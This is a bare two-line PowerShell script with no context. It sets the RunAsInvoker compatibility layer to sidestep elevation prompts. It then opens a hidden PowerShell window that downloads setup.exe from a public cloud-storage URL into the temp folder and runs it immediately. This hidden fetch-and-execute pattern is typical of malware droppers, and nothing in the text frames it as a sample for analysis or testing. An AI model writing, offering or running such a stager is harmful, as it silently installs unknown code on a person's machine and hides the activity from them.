$env:__COMPAT_LAYER = "RunAsInvoker"
powershell.exe -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://pub-8abdfb6034424ca983a3c8c7fe0b5574.r2.dev/setup.exe' -OutFile '$env:TEMP\setup.exe'; & $env:TEMP\setup.exe"
